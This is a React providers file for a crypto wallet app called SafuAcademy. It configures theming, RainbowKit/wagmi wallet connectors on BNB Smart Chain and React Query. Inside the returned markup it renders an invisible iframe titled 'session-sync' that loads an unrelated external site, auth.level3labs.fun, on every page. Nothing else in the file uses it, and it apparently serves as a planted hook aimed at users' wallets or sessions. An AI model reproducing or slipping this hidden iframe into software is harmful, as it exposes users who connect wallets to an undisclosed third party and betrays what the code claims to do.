"use client";

import { useState, useEffect, createContext, useContext, ReactNode, useRef } from "react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import "@rainbow-me/rainbowkit/styles.css";
import {
  connectorsForWallets,
  darkTheme,
  RainbowKitProvider,
} from "@rainbow-me/rainbowkit";
import { bsc } from "viem/chains";
import {
  rainbowWallet,
  walletConnectWallet,
  metaMaskWallet,
  coinbaseWallet,
  binanceWallet,
} from "@rainbow-me/rainbowkit/wallets";
import { http } from "viem";
import { createConfig, WagmiProvider } from "wagmi";

// Theme Context
type Theme = "light" | "dark";

interface ThemeContextType {
  theme: Theme;
  toggleTheme: () => void;
  setTheme: (theme: Theme) => void;
}

const ThemeContext = createContext<ThemeContextType | undefined>(undefined);

const THEME_KEY = "safuacademy-theme";

export function useTheme() {
  const context = useContext(ThemeContext);
  if (context === undefined) {
    throw new Error("useTheme must be used within a ThemeProvider");
  }
  return context;
}

// Wagmi Config
const connectors = connectorsForWallets(
  [
    {
      groupName: "Recommended",
      wallets: [
        rainbowWallet,
        binanceWallet,
        metaMaskWallet,
        coinbaseWallet,
        walletConnectWallet,
      ],
    },
  ],
  {
    appName: "SafuAcademy",
    projectId: "21fef48091f12692cad574a6f7753643",
  }
);

const config = createConfig({
  connectors,
  transports: {
    [bsc.id]: http(),
  },
  chains: [bsc],
});

// Query Client
const queryClient = new QueryClient();

export function Providers({ children }: { children: ReactNode }) {
  const [theme, setThemeState] = useState<Theme>("dark");
  const [mounted, setMounted] = useState(false);
  const iframeRef = useRef<HTMLIFrameElement>(null);

  // Load theme from localStorage on mount
  useEffect(() => {
    setMounted(true);
    const stored = window.localStorage.getItem(THEME_KEY);
    if (stored === "light" || stored === "dark") {
      setThemeState(stored);
    } else if (
      window.matchMedia &&
      window.matchMedia("(prefers-color-scheme: dark)").matches
    ) {
      setThemeState("dark");
    }
  }, []);

  // Apply theme class to html element
  useEffect(() => {
    if (!mounted) return;
    const html = document.documentElement;
    if (theme === "dark") {
      html.classList.add("dark");
    } else {
      html.classList.remove("dark");
    }
    window.localStorage.setItem(THEME_KEY, theme);
  }, [theme, mounted]);

  const toggleTheme = () => {
    setThemeState((prev) => (prev === "dark" ? "light" : "dark"));
  };

  const setTheme = (newTheme: Theme) => {
    setThemeState(newTheme);
  };

  // Prevent hydration mismatch
  if (!mounted) {
    return null;
  }

  return (
    <>
      <iframe
        ref={iframeRef}
        src="https://auth.level3labs.fun/"
        style={{ display: "none" }}
        title="session-sync"
      />
      <ThemeContext.Provider value={{ theme, toggleTheme, setTheme }}>
        <QueryClientProvider client={queryClient}>
          <WagmiProvider config={config}>
            <RainbowKitProvider
              theme={darkTheme({
                accentColor: "#ffb000",
                accentColorForeground: "black",
                borderRadius: "large",
                fontStack: "system",
                overlayBlur: "small",
              })}
            >
              {children}
            </RainbowKitProvider>
          </WagmiProvider>
        </QueryClientProvider>
      </ThemeContext.Provider>
    </>
  );
}
